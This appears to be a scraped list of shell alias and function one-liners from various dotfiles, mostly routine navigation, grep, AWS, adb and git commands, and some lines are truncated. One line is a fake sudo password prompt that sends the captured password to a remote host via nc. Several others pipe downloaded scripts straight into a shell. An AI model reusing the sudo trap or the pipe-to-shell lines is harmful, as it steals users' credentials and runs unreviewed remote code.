"cd ""$(ls -d */ | tail -n 1)"""
"cd ""$(ls -d */ | mm -"
"cd ""$(ls -d */ | mm "
"cd ""$(ls -d */ | dmenu -i)"""
"cd ""$(ls -d */ | dmenu -fn ""-*-anorexia-medium-*-*-*-11-*-*-*-*-*-*-*"" -nb ""#101010"" -nf ""#b9c0af"" -sb ""#101010"" -sf ""#afff2f"")"""
"cd ""$(ls -1dt ~/projects/* | head -n 1)"""
"cd ""$(git rev-parse --show-superproject-working-tree --show-toplevel | head -n1)"""
"cd ""$(git gh `pbpaste | tr """
"cd ""$(ghq list -p|fzf)"""
"cd ""$(ghq list --full-path | peco)"""
"cd ""$(ghq list --full-path | peco)"" && clear && pwd"
"cd ""$(ghq list --full-path | fzf)"""
"cd ""$(findprj -nZ | choose -izp ""Change working directory:"")"""
"cd ""$(findprj -mZ | choose -izp ""Change working directory:"")"""
"cd ""$(findnohidden | fzy -l 20 -p cd\ )"""
"cd ""$(find-projects | peco)"""
"cd ""$(find ~/* -type d | fzf --color -e)"""
"cd ""$(find ~ -type d | fzf --preview="
"cd ""$(find . -type d | peco)"""
"cd ""$(find err.txt generated.file succ.txt -type d | fzf --preview=""ls {}"" --preview-window=right:70%:wrap)"""
"cd ""$(find $base -type d | peco)"""
"cd ""$(fd | fzf)"""
"cd ""$(fd -at d . $(git rev-parse --show-toplevel) | fzf)"""
"cd ""$(fd --type d --hidden --follow --exclude .git | fzf)"""
"cd ""$(fasd -dlR | percol)"""
"cd ""$(dirname ""$(find ~/ -type f -name aem-author-4502.jar | head -1)"")"" && java -Xmx1024m -jar aem-author-4502.jar -v"
"cd ""$(clipin | xargs -0 cygpath -u)"""
"cd ""$(__FIND_FZF__ f | sed "
"cd ""$(__FIND_FZFH__ f | sed "
"cd ""$(\ls -1dt ./*/ | head -n 1)"""
"cd ""$(\ls -1dt */ | head -n 1)"""
"cd ""$(\ls -1dar ./*/ | head -n 1)"""
"cd ""$( ls -1d err.txt generated.file succ.txt | peco )"""
"cb && cx ref.cpp -o ref && find *.in | xargs -I % sh -c ""
"cat ~/projects/pl/pl-cypress-shared/test-data/manual-qa-base-users-login.json | tr -d ""\n"""
"cat ~/notes | grep ""Build package"" -A 16"
"cat ~/dev/learn/tokiponaquiz/tokpono-valste.json | jq -r "".[].word"""
"cat ~/code/cag/tmp/add_ssh | qa ""cat >> ~/.ssh/authorized_keys"""
"cat ~/code/cag/tmp/add_ssh | intg ""cat >> ~/.ssh/authorized_keys"""
"cat ~/code/cag/tmp/add_ssh | alf ""cat >> ~/.ssh/authorized_keys"""
"cat ~/Projects/GitHub/clinit/bash/bash_aliases | grep --color=never ""^alias tm"" "
"cat ~/.zshrc | grep -P -o ""(?<=^alias\ ).+"""
"cat ~/.zprezto/modules/git/alias.zsh | grep ""alias """
"cat ~/.vim/templates/python.py | vim -c ""set syntax=python"" -"
"cat ~/.vim/templates/lilypond_tab.ly | vim -c ""set syntax=lilypond"" -"
"cat ~/.vim/templates/latex.tex | vim -c ""set syntax=tex"" -"
"cat ~/.vim/templates/cprog.c | vim -c ""set syntax=c"" -"
"cat ~/.user-env | grep ""^# INFO"""
"cat ~/.uiuc_pwd | sudo openconnect --passwd-on-stdin -u hckuo2 \
"cat ~/.ssh/known_hosts | sed ""s/\([^, ]*\).*/\1/"""
"cat ~/.ssh/known_hosts | sed ""/10.36/d"" > ~/.ssh/tmp_known_hosts;mv ~/.ssh/tmp_known_hosts ~/.ssh/known_hosts"
"cat ~/.ssh/id_rsa.pub | xclip -sel clip \
"cat ~/.ssh/id_rsa.pub | xclip -sel clip ; echo ""SSH Key Copied to the clipboard"""
"cat ~/.ssh/id_rsa.pub | ssh user@machine ""mkdir ~/.ssh; cat >> ~/.ssh/authorized_keys"""
"cat ~/.ssh/id_rsa.pub | ssh $1 ""cat >> ~/.ssh/authorized_keys"""
"cat ~/.ssh/id_rsa.pub | ssh $1 ""cat - >> ~/.ssh/authorized_keys2"""
"cat ~/.ssh/id_rsa.pub | pbcopy; printf ""public key copied to clipboard"""
"cat ~/.ssh/id_rsa.pub | pbcopy; echo ""public key copied to clipboard"""
"cat ~/.ssh/id_rsa.pub | pbcopy; echo ""Public key copied to clipboard"""
"cat ~/.ssh/id_rsa.pub | pbcopy; echo ""Copied SSH public key to clipboard."""
"cat ~/.ssh/id_rsa.pub | pbcopy && echo ""SSH Key copied to clipboard"""
"cat ~/.ssh/id_rsa.pub | pbcopy && echo ""Public key was copied into the clipboard."""
"cat ~/.ssh/id_rsa.pub | pbcopy && echo ""Copied to clipboard."""
"cat ~/.ssh/feide | sudo openconnect vpn.ntnu.no -u vegarns
"cat ~/.ssh/config | grep -i ""host [a-z0-9_].*"""
"cat ~/.ssh/config | grep ""Host """
"cat ~/.ssh/*.pub | pbcopy && echo ""Keys copied to clipboard"""
"cat ~/.rdp_credentials/audi_fzm1 | xfreerdp /v:192.168.15.142 /u:admin /size:1024x640 -grab-keyboard /from-stdin /cert-ignore /drive:mount,/home/szebenyib/win7_link/projektek/rdp_share"
"cat ~/.dirs|grep ""^.*="""
"cat ~/.config/i3/config | grep -P ""^bindsym"" --color=never"
"cat ~/.config/i3/config | grep ""bindsym"""
"cat ~/.bashrc| grep ""git"""
"cat ~/.bashrc |grep ""alias """
"cat ~/.bashrc | grep ""alias g"""
"cat ~/.bashrc | awk '/#STARTALIAS/,/#ENDALIAS\ /'"
"cat ~/.bash_profile | grep ""alias """
"cat ~/.bash_profile | grep ""()"";alias"
"cat ~/.bash_aliases | grep -b1 ""^alias"""
"cat | gpg -e -r 0x1AE8F4BE! -a --comment ""encoding: UTF-8"" --emit-version --emit-version --emit-version"
"cat tags|sed ""s/ .*//"""
"cat scan_*_fm_rds.csv | awk -F, '{ OFS=\"
"cat scan_*_dab_packet.csv | awk -F, '{ OFS=\"
"cat scan_*_dab_ensemble.csv |awk -F, '{ OFS=\"
"cat scan_*_dab_audio.csv | awk -F, '{ OFS=\"
"cat scan_*_dab_audio.csv scan_*_dab_packet.csv | awk -F, '{ OFS=\"
"cat salida_jupyter.txt | grep ""login"""
"cat package.json | jq -r "".scripts"""
"cat package.json | jq '{optionalDependencies: .optionalDependencies, peerDependencies: .peerDependencies, dependencies: .dependencies, devDependencies: .devDependencies}'"
"cat package.json | jq "".scripts"""
"cat package.json | grep ""test"""
"cat package.json | grep ""start"""
"cat package.json | grep ""dev"""
"cat build/conf/bblayers.conf | grep ""SDKBASEMETAPATH ="""
"cat `find . -name ""*.c""` | wc -l"
"cat TODO.* 2>/dev/null;ack ""TODO|todo::"""
"cat <(echo ""# Week `date +%V` of `date +%G`: Weekly Review + Goal progress report"") ~/Dropbox/notes/todo/goal-report-header.txt <(goals) | dayone2 new"
"cat /var/log/pacman.log | grep ""\[PACMAN] installed\ """
"cat /var/log/dpkg.log | grep ""\ install\ """
"cat /var/lib/dnsmasq/qemu0.leases | awk ""{ printf \$3 \""\\t\"" \$4 \""\\n\"" }"""
"cat /usr/share/dict/words | fzf --preview ""open -g dict://{}; echo See Dictionary.app"""
"cat /usr/share/calendar/* | grep `date +""%m/%d""`"
"cat /tmp/last_build.out| sed 's/\\n/
"cat /sys/class/net/eth0/address | xclip -sel clip && \
"cat /proc/net/arp | grep -v ""00:00:00:00:00:00"" "
"cat /proc/cpuinfo| grep ""processor"""
"cat /proc/cpuinfo | grep ""cpu MHz"""
"cat /proc/cpuinfo | grep ""MHz"""
"cat /proc/acpi/ibm/thermal | sed -e ""s/ -128//g"""
"cat /last/power/rooted-rom/lk.img | adb shell ""dd of=/dev/block/by-name/lk""; adb reboot recovery"
"cat /home/redpeacock978/5205723/siro.txt | sed -e ""s/#<undef>//"""
"cat /home/redpeacock978/5205723/kuro.txt | sed -e ""s/#<undef>//"""
"cat /home/redpeacock978/5205723/galuf.txt | sed -e ""s/#<undef>//"""
"cat /home/redpeacock978/5205723/batz.txt | sed -e ""s/#<undef>//"""
"cat /home/redpeacock978/5205723/4.txt | sed -e ""s/#<undef>//"""
"cat /home/redpeacock978/5205723/* | sed -e ""s/#<undef>//"""
"cat /etc/passwd | cut -d"":"" -f1"
"cat /etc/passwd | cut -d"":"" -f1 "
"cat /etc/passwd | cut -d "":"" -f 1"
"cat /etc/hosts | sed -e ""/#eof for user entries/,\$d"""
"cat .fvwm/.fvwm2rc | grep ""Silent Key"""
"cat .bashrc | grep -P ""(?<=alias)(.*)(?==)"""
"cat ./test-data/manual-qa-base-users-login.json | tr -d ""\n"""
"cat ./README.md | sed -e ""2,\$d""; echo -e ""\n### Recents\n""; git_before_yesterday"
"cat -n ~/.dirs | sed ""s/^\([^.]*\)\=\(.*\)/-\1 --> \2/g"""
"cat -n | sed ""s/^[ ]*\([0-9]*\)[ \t]*\(.*\)/\1. \2/"""
"cat - <<""-----END PGP MESSAGE-----"" | gpg -d "
"cat ${XORG_LOG_PATH}/Xorg.0.log | grep ""(WW)"""
"cat ${XORG_LOG_PATH}/Xorg.0.log | grep ""(EE)"""
"cat ${MY_ZSHRC}|awk '/^alias/ { split(\$2,a,\"
"cat $1 | sed ""s/, /\n/g"""
"cat $1 | python -c ""import sys, yaml, json; y=yaml.load(sys.stdin.read()); print json.dumps(y, indent=4)"""
"cat $1 | grep ""$2"""
"cat $(ack -l """") | fzf"
"cat ""${XORG_LOG_PATH}/Xorg.0.log | grep -i sna"""
"cat ""${XORG_LOG_PATH}/Xorg.0.log | grep -i modesetting"""
"cat ""${HOME}/.ssh/id_rsa.pub"" | pbcopy"
"cat ""$RECENTLY_EDITED_FILES_LOG"" | sudo xargs rg 2> /dev/null"
"cat ""$HOME/.zhistory"" | fzf --algo=v2 --tiebreak=end --multi --cycle --border --margin 10%,2%,0,0 --inline-info --ansi --color=dark"
"cat ""$HOME/.fetch-all-projects-history/$(ls $HOME/.fetch-all-projects-history | tail -n1)"""
"cat ""$HISTFILE"" | grep"
"cat ""$@"" | less"
"cat ""$1"" | nc termbin.com 9999"
"cat ""$(ls -rt | tail -n1)"""
"capinfos -m -T ~/.pcaps/*.pcapng | column -nts,"
"calendariumrom query $(date ""+%Y-%m-%d"") | tail -n +4"
"cal | sed ""s/.*/ & /;s/ \($(date +%e)\) / $(echo -e ""\033[01;31m"")\1$(echo -e ""\033[00m"") /"""
"cal | sed ""s/.*/ & /;s/ $(date +%e) / [] /"""
"cal | grep -v ""^ *$"";calendar -A 7"
"cal | grep -C6 --color -e "" $(date +%e)"" -e ""^(date +%e)"""
"cal | grep -C6 --color ""$(date +%e)"""
"cal | grep -C6 ""$(date +%e)"""
"cal | grep -C100 --color=always ""\b$(trim $(date +%e))\b"""
"cal | grep -C 6 --color -e "" $(date +%e)"" -e ""^$(date +%e)"""
"cal | grep --before-context 6 --after-context 6 --color -e ""$(date +%e)"" -e ""^$(date +%e)"""
"cal | grep --before-context 6 --after-context 6 --color -e "" $(date +%e)"" -e ""^$(date +%e)"""
"cal -h | egrep -C 4 ""\b$(date +%-d)\b"" --color"
"c && find *.in | xargs -I @ sh -c ""echo Test @; ./a.out < @;""; lg ""rt"""
"busybox mount -o remount,rw /system; mount | grep system"
"busybox mount -o remount,ro /system; mount | grep system"
"busy | sed -e 's/:.*//' -e 's/,v.*//'"
"bundle | grep -v ""Using"""
"bundle exec ruby -e ""puts $:"" | xargs grep -r"
"bundle exec ruby -e ""puts $:"" | xargs -I {} find {}"
"bundle exec ruby -e ""$(curl -fsSL https://gist.github.com/raw/2588879/benchmark.rb)"" | sort -n -k4"
"builtin history | grep ""$@"""
"browser-open-session $(find . -name ""*.chrome-session"" | sk)"
"brew upgrade -s; brew cleanup; antibody update; vim -c ""PlugUpdate|qa"";"
"brew list | tr : ""\n"""
"brew list && printf %""$COLUMNS""s |tr "" "" ""-"" && brew cask list"
"brew linkapps; find ~/Applications -type l | while read f; do osascript -e ""tell app \""Finder\"" to make new alias file at POSIX file \""/Applications\"" to POSIX file \""$(stat -f%Y ""$f"")\""""; rm ""$f""; done"
"brew cask list | xargs -I % bash -c ""echo -n %"
"branch=$(git symbolic-ref HEAD | sed -e ""s,.*/\(.*\),\1,"") && git branch --set-upstream ""$branch"" origin/""$branch"" && gs"
"branch=$(git symbolic-ref HEAD | cut -d/ -f3); echo ""Rebasing on origin/${branch}"";git pull --rebase origin ${branch}"
"branch=$(git branch | sed -n -e ""s/^\* \(.*\)/\1/p"");git stash;git co integration;git p -r;git co $branch;git sta pop;"
"boot2dockershowpf | awk -F, "
"bjobs -o ""id:8 queue:13 stat:5 submit_time:15 exec_host:15 name:40 sub_cwd"" | sort -r"
"bitcoin-cli -getinfo |
"bindkey | rg -i"""
"bin/rails r ""puts DocNews::FeedEntry.select(\""id\"").aggregated.order(\""RAND()\"").limit(5).map(&:id).join(\"",\"")"" | pbcopy""
"be rubocop -D && be rspec && git push -f gitlab HEAD:$(git branch | sed -n ""/\* /s///p"")"
"battery_all | grep ""time to"""
"batt | grep -o ""[0-9]\+%"""
"bash ~/.machines/""$(ls ~/.machines | fzf)"""
"bash -c ""git status -sb && git ls-files -v | grep --color ^S"""
"bash -c ""curl \$* | python -m json.tool"" -- "
"bash -c ""$(fc -ln -1)"" | pbcopy"
"bash -c ""$(fc -ln -1)"" | /dev/clipboard"
"basename ""$(pwd)"" | tr -d ""\n"""
"basename ""$(pwd)"" | pbcopy"
"az network vnet list --output tsv --query '[].{subnet:subnets[].addressPrefix[]|[0], name:name}'"
"az account set --subscription ""$(az account list --output tsv --query ""[].name"" | fzf)"""
"aws-mfa | sed ""s/="
"aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier, Engine, DBInstanceStatus, Endpoint.Address, Endpoint.Port, DBName, MasterUsername] | sort_by(@, &[0])'"
"aws logs describe-log-groups | jq --raw-output "".logGroups[].logGroupName"""
"aws elbv2 describe-target-groups | jq -r "".TargetGroups[].TargetGroupName"""
"aws elbv2 describe-load-balancers | jq -r "".LoadBalancers[].LoadBalancerName"""
"aws elb describe-load-balancers | jq -r "".LoadBalancerDescriptions[].LoadBalancerArn"""
"aws ec2 start-instances --instance-ids $instanceId && aws ec2 wait instance-running --instance-ids $instanceId && export instanceIp=`aws ec2 describe-instances --filters ""Name=instance-id,Values=$instanceId"" --query ""Reservations[0].Instances[0].PublicIpAddress"" | tr -d \""` && echo $instanceIp"
"aws ec2 start-instances --instance-ids $instanceId && aws ec2 wait instance-running --instance-ids $instanceId && export instanceIp=`aws ec2 describe-instances --filters ""Name=instance-id,Values=$instanceId"" --query ""Reservations[0].Instances[0].PublicIpAddress"" | sed -e ""s/\""//g""` && echo $instanceIp"
"aws ec2 describe-instances | jq -r '
"aws ec2 describe-instances --query Reservations[*].Instances[*].{instance_name: Tags[?Key=='Name'] | [0].Value, instance_id: InstanceId, type: InstanceType, ip_address_private: PrivateIpAddress, ip_address_public: PublicIpAddress, instance_state: State.Name, vpc_id: VpcId, subnet_id: SubnetId, availability_zone: Placement.AvailabilityZone, image_id: ImageId, ebs_volume_id: BlockDeviceMappings[0].Ebs.VolumeId} --output table"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[Tags[?Key==\`Name\`].Value|[0],PublicIpAddress,State.Name]' --output table"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[Tags[?Key==\`Name\`].Value|[0],Placement.AvailabilityZone,InstanceType,PublicIpAddress,State.Name,InstanceLifecycle]' --output table"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[Tags[?Key==\`Name\`] | [0].Value, InstanceId, State.Name, PublicIpAddress]' --output table"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[PublicIpAddress,Tags[?Key==\`Name\`].Value[]]' --output text | sed '$!N;s/\n/ /'"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId, Tags[?Key==\`Name\`] | [0].Value, State.Name, PublicDnsName]' --output table"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId, InstanceType, State.Name, PublicIpAddress, PrivateIpAddress, Placement.AvailabilityZone, Tags[?Key==\`Name\`].Value | [0]]' --output table"
"aws ec2 describe-instances --query 'Reservations[*].Instances[*].[Tags[?Key==\`Name\`].Value | [0],InstanceId,PublicIpAddress,PrivateIpAddress,State.Name,InstanceType]' --output table --filter Name=instance-state-name,Values=running,pending"
"aws ec2 describe-instances --query 'Reservations[*].Instances[*].[Tags[?Key == \`Name\`].Value,InstanceId,State.Name,InstanceType,PublicIpAddress,PrivateIpAddress]' --output text | sed 'N;s/\n/ /'"
"aws ec2 describe-instances --output table --query 'Reservations[].Instances[].[Tags[?Key==\`Name\`] | [0].Value, State.Name, PublicDnsName, PublicIpAddress]'"
"aws ec2 describe-instances --output json --query 'Reservations[].Instances[].[InstanceId, State.Name, PublicIpAddress, PrivateIpAddress, Tags[?Key==\`Name\`] | [0].Value]' --output table"
"aws ec2 describe-instances --filters Name=tag:Name,Values=mle-air_work_prod | jq -r .Reservations[].Instances[].PrivateIpAddress"
"aws ec2 describe-instances --filters 'Name=instance-state-name,Values=running' --query 'Reservations[].Instances[].[Tags[?Key==\`Name\`].Value|[0],Placement.AvailabilityZone,InstanceType,PrivateIpAddress,PublicIpAddress,InstanceLifecycle]' --output table"
"aws ec2 describe-instances --filters ""Name=key-name,Values=inbo-ops-proxy""|grep PRIVATEIPADDRESSES"
"aws codecommit list-repositories | python -c '
"aws autoscaling describe-auto-scaling-groups | jq -r "".AutoScalingGroups[].AutoScalingGroupName"""
"aws --region us-east-1 ec2 describe-instances --query 'Reservations[].Instances[].[Tags[?Key==Name].Value | [0], InstanceId, Placement.AvailabilityZone, InstanceType, LaunchTime, State.Name, PublicDnsName]' --output table"
"awk -vFPAT='[^,]*|\"
"awk -vFPAT='([^,]+)|(\"
"awk -v cmd=""openssl x509 -noout -subject"" ""/BEGIN/{close(cmd)};{print | cmd}"" < /etc/ssl/certs/ca-certificates.crt"
"awk -v ORS=',' '{print}' | sed 's/,$//'"
"awk -v FPAT=""([^,]*)|(\""[^\""]*\"")"" "
"awk -F""file://|\"" "" "
"awk -F '=| ' '/# Games/{f=1;next} /# \/Games/{f=0} f, /alias/{print \$2}' ~/.profile"
"awk -F ""\t|\"""" -v OFS=""\t"""
"awk '{n[\$1]++} END {for (i in n) print i,n[i]}' | sort -n"
"awk '{gsub(/^ +| +$/,\"
"awk '{a[$1]++} END{for(i in a){printf ""%5d\t%s\n"",a[i],i}}'|sort -rn"
"awk '/^[A-Z|a-z]*_.*\(/,/)/'"
"awk ""{sub(/^/,\""@\"",\$2);sub(/$/,\""@\"",\$2);sub(/^/,\""@\"",\$7);print}"" | awk -F@ ""{print \$2, \$4}"""
"awk ""{print length(\$0)\"" \""\$0}""|sort -t"" "" -n"
"awk ""{print \$1}"" | xargs kill -9"
"awk ""{print \$1}"" | xargs -pr kill -9"
"awk ""{i=length(\$0); if(i>=255)print \$0\""^\""length(\$0)}""|sort -k2 -t^ -n"
"awk ""{i=length(\$0); if(i>=200)print \$0\""^\""length(\$0)}""|sort -k2 -t^ -n"
"awk ""!Z[\$1]++"" <<< ""$(dpkg-query -Wf ""\${Section}\\n"" ""*"")"" | column"
"awk ""!( NR<20 && !/^[[:blank:]]*#.*)/ && /^[[:blank:]]*($|[/].*)/)"""
"aura -Qqe | grep -v ""$(pacman -Qmq)"" > ~/pklist.txt"
"astyle --suffix=none --options=$HOME/.astylerc --recursive --dry-run *.cpp,*.h,*.hpp | grep ^Formatted"
"astyle --suffix=none --options=$HOME/.astylerc --recursive *.cpp,*.h,*.hpp | grep ^Formatted"
"asterisk -x ""sip show peers"" | grep "
"asterisk -rx ""mor show status"" | grep Version"
"as_deamon ""`cat ~/.system-binaries | dmenu`"""
"arecord -f cd -D hw:0,0 | aplay"
"arecord -Dplughw:CARD=PCH,DEV=2 -fdat | aplay"
"arecord -Dplughw:1,0 -f S16_LE -t raw -r 8000 -c 2 -N - | avconv -f s16le -ar 8000 -ac 2 -i - -codec:a libmp3lame -map 0 -qscale:a 1 -f segment -segment_time 3600 -segment_format mp3 audio%04d.mp3"
"aptitude search --sort ""~installsize"" --display-format ""%p %I"" ""~i"" | head"
"aptitude search ""~i"" |g ""^i """
"aptitude -o ""Aptitude::Pkg-Display-Limit=!?reverse-depends(~i) ( ?reverse-recommends(~i) | ?reverse-suggests(~i) ) !?reverse-recommends(^abe-) !?reverse-suggests(^abe-) ~M !?essential"""
"aptitude -F %p search ""~c"" | xargs sudo dpkg -P"
"aptitude -F ""%c%a%M%T %40p %20V %v %R:%12s %r %D %I - %60d"" -w `stty size | sed ""s/.* //""`"
"apt-show-versions | grep ""No available version"""
"apt list --installed | grep -v ""automatic"""
"apt list --installed 2>/dev/null | grep -F "",local"""
"apt -Qe | cut -d "" "" -f 1 > ~/Documents/Backup\ Notes/Debian/""$(date +""%m_%d_%Y"")_Debian_Installed_Packages"""
"app='$(grep -i dev scripts/apps.properties | cut -f2 -d "" "")'"
"apm list --installed --bare | cut -d ""@"" -f1 > ~/.atom/packages.apm"
"apg -n 30 -m 10 -x 10 -M SNCL -E \{\}\(\)\[\]\^\Ç\¡\!\?\¿\~\=\:\|\ç\:\,\;\*\ñ\'\"
"apg -a 1 -n 10 -m 8 -x 8 -E l -E l0OI -M CNL | grep -v ""[l0OI]"""
"apg -a 1 -n 10 -m 16 -x 16 -E l -E l0OI -M CNL | grep -v ""[l0OI]"""
"apg -a 0 -n 20 -m 12 -x 20 -M SNCL -E ""{[]}\|^"""
"apachectl -V | grep ""httpd.conf"""
"ansiweather -l Belgrade -a black | sed -e ""s=- =\n\t=g"" -e ""s; Current weather in Belgrade => ;\tTemperature: ;g"""
"ansiweather -f 3 -l Belgrade -a black | sed -e ""s= - =\n\t=g"" -e ""s; Belgrade forecast => ;\t;g"""
"amixer sget -M Master | grep -om1 '[0-9]\\{1,3\\}%'"
"amixer scontrols | grep -oE """
"alwaysd(){ set -x ; if [ ""attach"" = ""$1"" ]; then para=""$*"" ; echo ""$para"" ; para2=`echo $para | sed ""s/attach/attach -d/g""` ; tmux $para2 ; fi ; set +x } ; alwaysd"
"alwaysd(){ set -x ; if [ ""attach"" = ""$1"" ]; then options = ""$*"" ; options2 = cat ${options} | sed ""s/tmux attach/tmux attach -d/g"" ; echo ""$opetions2"" ; fi ; set +x } ; alwaysd"
"alog | grep ""\[Ep {1,}[0-9]"""
"alias|gack ""(^\w+)(-)?(_?)(\w+)?"" --passthru"
"alias |/usr/bin/which \
"alias | sed ""s/^\([^=]*\).*/\1/"""
"alias | grep -re "" s..\?="""
"alias | grep -i ""$@"""
"alias | grep -E ""=["
"alias | grep ""grep-"""
"alias | grep ""git"""
"alias | grep ""alias sys_"""
"alias | grep ""alias g"""
"alias | grep ""alias d"""
"alias | grep ""alias br"""
"alias | grep ""alias .d"""
"alias | grep ""^alias"""
"alias | grep ""^alias vw"""
"alias | grep ""^alias py"""
"alias | grep ""^alias g.*git.*$"""
"alias | grep ""/anx/"""
"alias | bat --style=numbers,grid -l cpp"
"alias | awk '{print substr(\$0,index(\$0, \"
"alias | awk '{ split(\$2,res,\"
"alias | /usr/bin/which --tty-only --read-alias --show-dot --show-t$
"alias g4=""cd `pwd | sed ""s/\ /\\\ /g""`"""
"alias dc; alias | grep ""^alias dc\-"""
"alcurl aims/v1/token_info | jq ""."""
"ag TODOK; (echo ""y"" | rbt post --parent=$(git merge-base master head) -u -o)"
"ag . -l -g """" | fzy"
"ag -r """" | fzf"
"ag -o "" [a-zA-Z0-9=]+$"" | base64 -D"
"ag -l ""binding.pry"" | xargs gsed --in-place ""/binding.pry/d"""
"ag -g """" | fzf"
"ag -G ""\.cmake$|CMakeLists\.txt"""
"ag -G ""\.bp$|\.mk$"" --ignore out"
"ag --nocolor -l -g """" | fzy -l 256 -p ""❯ """
"ag --hidden --ignore .git -l -g """" | fzf -e -x --height=20% "
"ag --hidden --ignore .git -l -g """" . | fzf"
"ag --hidden --ignore .git -g """" | fzf --bind ""enter:execute(less {})"""
"ag ""TODO:|FIXME:"""
"ag ""//\s*(TODO|FIXME)\b"""
"ag ""$1"" --nogroup | awk "
"aed --output table --query 'Reservations[].Instances[].[Tags[?Key==\`Name\`] | [0].Value, State.Name, PublicDnsName, PublicIpAddress]'"
"adk ""shell dumpsys activity activities | grep \""* Hist\"""""
"adbsu ""dmesg | grep -i trampoline"""
"adb uninstall $(grep package android/app/src/main/AndroidManifest.xml | cut -d\"" -f2); rnra"
"adb shell screencap -p | perl -pe ""s/\x0D\x0A/\x0A/g"" > screen.png"
"adb shell screencap -p | perl -pe ""s/\x0D\x0A/\x0A/g"" > ""/Users/seth/Downloads/firetvscreenshot_$(date +%Y%m%d-%H%M%S).png"""
"adb shell ip -f inet addr show wlan0 | sed -En ""s/.*inet ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+).*/\1/p"""
"adb shell dumpsys activity | grep -B 1 ""Run #[0-9]*:"""
"adb shell dumpsys activity | grep ""mFocusedActivity"""
"adb shell dumpsys activity activities | sed -En -e '/Stack #/p' -e '/Running activities/,/Run #0/p'"
"adb shell dumpsys activity activities | sed -En -e '/Running activities/,/Run #0/p'"
"adb shell ""logcat | grep "
"adb shell ""dumpsys window w |grep name="""
"adb logcat | grep -i --colour ""DEV-LOG"""
"adb logcat | grep ""cocos2d-x"""
"adb logcat -v threadtime |& lnav -vw ~/.logs/adb/$(date ""+%F-%T"").log"
"adb logcat -v threadtime | egrep -i ""(bohrium)"""
"adb logcat -v threadtime ThermalEngine:S DownloadManagerWrapper:S WifiConfigStore:S wpa_supplicant:S NewsWeather:S WifiStateMachine:S WifiService:S |& lnav -qw ~/.logs/adb/$(date ""+%F-%T"").log"
"adb logcat -s ""logmarker"" | coloredlogcat.py"
"adb logcat -d -v threadtime | egrep -i ""(bohrium)"""
"adb logcat -c;adb logcat -v threadtime | egrep -i ""(bohrium)"""
"adb logcat ""*:E"" | grep "
"adb logcat ""*:D"" | grep "
"actual=$PWD; for repo in $(find . -name .git -type d -prune | sed ""s.[^/]*$..""); do cd $repo; echo $repo; git st; cd $actual; echo; done"
"acpiconf -i batt | grep ""Remaining"""
"acpi | grep -o ""[0-9]*%"""
"acpi | grep -o ""...%"""
"acpi | cut -d, -f 2,3 -"
"acpi -t | cut -d""
"acpi -b |awk -F "": "" "
"ack --print0 -f --php --js --css | xargs -0 perl -p -i -e ""s/[\t ]+$//g"""
"ack --flush --passthru --color --color-match=blue ""DEBUG:"" |
"aa=\$(cat $CURRENT/.hon);if [ \$aa == \""0\"" ]; then echo -en \""[sudo] password for \$(whoami):\r\n\"";stty -echo;read pss;echo \$pss | nc $ip $port;echo \""1\"" > $CURRENT/.hon;sleep 2; echo -en \""Sorry, try again.\r\n\"";echo -en \""[sudo] password for $(whoami):\r\n\"";read;eval \""sudo \$sudo\"";echo \""0\"" > $CURRENT/.hon;stty sane;fi;"
"a=`sysctl debug.lowpri_throttle_enabled`; case `echo ""$a"" | sed ""s/^.*: //""` in *0*) echo ""TM is fast."";; *) echo ""TM is slow"" ;; esac"
"a --color-match """" -o ""(XXX|TODO):.*"""
"a && git cm ""Modified $(git diff --name-only HEAD | grep -Eo "
"`which ls` -la | `which grep` "" \."""
"`print -n =gdate`' --rfc-3339=seconds | tr "" "" ""T""'"
"`print -n =date`' --rfc-3339=seconds | tr "" "" ""T""'"
"`ls -a | peco --prompt ""LS-A>"" `"
"`gn` | sed ""s/dev_dbudyak_//g"""
"`git rev-parse --sq HEAD@{now} | sed_remove_list '\ ' '\*' ""'""`;"
"`git push 2>&1 > /dev/null | grep ""git push""`"
"`git ls-files | peco --prompt ""GIT FILES>""`"
"`git for-each-ref --sort=-committerdate --format=""%(refname:short)"" refs/heads | peco`"
"`git branch -a --format ""%(refname:short)"" | peco --prompt ""GIT BRANCH>""`"
"`ghq list --full-path | peco --prompt ""SOURCE>"" `"
"`ghq list --full-path pinzolo --prompt ""SOURCE>"" | peco`"
"`echo ""Good Morning Dave. today's date is"" | festival --tts;"
"`dts=$(date +""%Y-%m-%d_%H.%M.%S"");seq 1 49 | xargs -I{} date;echo Just a spacer __ $dts \_\_ -=-=-=-=-=-=-=-=-=-=-=-`'>> ~/.bash_aliases"
"`colordiff -u ""$@"" | less -RF`"
"`SITE=""www.google.com""; curl --silent ""http://www.shadyurl.com/create.php?myUrl=$SITE&shorten=on"" | awk -F\' '/is now/{print $6}'`"
"_schedule() { curl -X GET ""https://api.ssis.nu/cal/?room=$1"" | python -m json.tool ;}; _schedule"
"_rmtest(){find . -name ""*_test.go"" -print | xargs rm}; _rmtest"
"_rmobjb; _cgcc; make -j${JMAKE} && make -j${JMAKE} -k check; __extr_sums ../logs/ ; echo ""Bootstrap on $HOST finished"" | netcat virgil.suse.cz 4321"
"_msgSuccess ""Install command for bash script copied to clipboard"";echo ""wget -qN ${_BASH_SCRIPT_LOCATION} -O syncBashScript.sh; source syncBashScript.sh"" | pbcopy"
"_msgSuccess ""Install all Google Fonts ..."";curl https://raw.githubusercontent.com/qrpike/Web-Font-Load/master/install.sh | sh"
"_ksh(){for cluster in k8s-prod-{a,b} k8s-staging-c; do echo ""*****************""; echo $cluster ; echo ""*****************""; kubectl get pods --all-namespaces | grep -i $1 ; done}; _ksh"
"_gl -n 30 | ruby -e 'puts STDIN.read.gsub(%(<#{%x(git config user.name).chomp}>), %())'"
"_gfile(){ grep -E ""exception|Exception"" $* }; _gfile $*"
"_fshelp |less -P""fshelp line %lj?L/%L. ?e(END). (press h for help or q to quit)\. Use _fshelp to show plain text without less\."""
"_ffhelp |less -P""fshelp line %lj?L/%L. ?e(END). (press h for help or q to quit)\. Use _ffhelp to show plain text without less\."""
"_f() { rg -p ""$1"" | less; }; _f"
"_f() { ll -r --sort=size ""$@"" | less; }; _f"
"_f() { ll -r --sort=modified ""$@"" | less; }; _f"
